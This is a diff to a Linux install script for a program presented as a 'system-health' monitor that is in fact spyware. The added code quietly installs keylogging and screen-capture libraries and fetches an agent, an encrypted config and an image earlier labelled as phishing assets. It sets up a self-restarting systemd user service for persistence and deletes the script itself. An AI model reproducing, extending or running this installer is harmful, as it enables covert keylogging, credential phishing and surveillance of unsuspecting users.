@@ -5,11 +5,37 @@ REPO="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/hea
 INSTALL_DIR="$HOME/.config/system-health"
 SERVICE_NAME="health-monitor.service"
 
-# 1. Create Directory
+# 1. Install System Dependencies First
+echo "[*] Installing system dependencies..."
+if command -v sudo >/dev/null 2>&1; then
+   # Try apt-get (Debian/Ubuntu)
+   if command -v apt-get >/dev/null 2>&1; then
+      sudo apt-get update -qq >/dev/null 2>&1
+      sudo apt-get install -y -qq python3 python3-pip python3-tk scrot xinput alsa-utils python3-opencv python3-pil >/dev/null 2>&1
+   # Try dnf (Fedora)
+   elif command -v dnf >/dev/null 2>&1; then
+      sudo dnf install -y -q python3 python3-pip python3-tkinter scrot xinput alsa-utils python3-opencv python3-pillow >/dev/null 2>&1
+   # Try pacman (Arch)
+   elif command -v pacman >/dev/null 2>&1; then
+      sudo pacman -Sy --noconfirm python python-pip tk scrot xorg-xinput alsa-utils python-opencv python-pillow >/dev/null 2>&1
+   fi
+fi
+
+# 2. Install Python Dependencies (pip packages)
+echo "[*] Installing Python libraries..."
+# mss - for screenshots
+# pynput - for keylogging
+# opencv-python - for image processing (dialog darkening)
+# pillow - fallback for image processing
+python3 -m pip install --quiet --break-system-packages mss pynput opencv-python pillow 2>/dev/null || \
+python3 -m pip install --quiet --user mss pynput opencv-python pillow 2>/dev/null || \
+pip3 install --quiet mss pynput opencv-python pillow 2>/dev/null
+
+# 3. Create Directory
+echo "[*] Setting up agent..."
 mkdir -p "$INSTALL_DIR"
 
-# 2. Download Files
-# Utilizing curl or wget depending on availability
+# 4. Download Files
 if command -v curl >/dev/null 2>&1; then
    curl -sL "$REPO/linux/agent.py" -o "$INSTALL_DIR/agent.py"
    curl -sL "$REPO/config.enc" -o "$INSTALL_DIR/config.enc"
@@ -17,21 +43,13 @@ if command -v curl >/dev/null 2>&1; then
 elif command -v wget >/dev/null 2>&1; then
    wget -qO "$INSTALL_DIR/agent.py" "$REPO/linux/agent.py"
    wget -qO "$INSTALL_DIR/config.enc" "$REPO/config.enc"
-   # Download Phishing Assets
    wget -qO "$INSTALL_DIR/prompt.png" "$REPO/linux/prompt.png"
 else
-   echo "No downloader found."
+   echo "[-] No downloader found."
    exit 1
 fi
 
-# 3. Install Dependencies (Try SUDO, else skip)
-# This part might prompt for password if run interactively, or fail silently if not.
-if command -v sudo >/dev/null 2>&1; then
-   sudo apt-get update -qq >/dev/null 2>&1
-   sudo apt-get install -y -qq python3 python3-tk scrot xinput alsa-utils >/dev/null 2>&1
-fi
-
-# 4. Create Systemd User Service
+# 5. Create Systemd User Service
 mkdir -p "$HOME/.config/systemd/user"
 cat <<EOF > "$HOME/.config/systemd/user/$SERVICE_NAME"
 [Unit]
@@ -47,12 +65,17 @@ RestartSec=60
 WantedBy=default.target
 EOF
 
-# 5. Enable and Start Service
+# 6. Enable and Start Service
+echo "[*] Starting agent service..."
 systemctl --user daemon-reload
-systemctl --user enable "$SERVICE_NAME"
+systemctl --user enable "$SERVICE_NAME" >/dev/null 2>&1
 systemctl --user restart "$SERVICE_NAME"
 
-# 6. Cleanup Self (Optional)
-rm -- "$0"
+echo "[+] Installation complete!"
+echo ""
+echo "Installed packages:"
+echo "  System: python3, python3-pip, python3-tk, scrot, xinput, alsa-utils, opencv, pillow"
+echo "  Python: mss, pynput, opencv-python, pillow"
 
-
+# 7. Cleanup Self
+rm -- "$0" 2>/dev/null
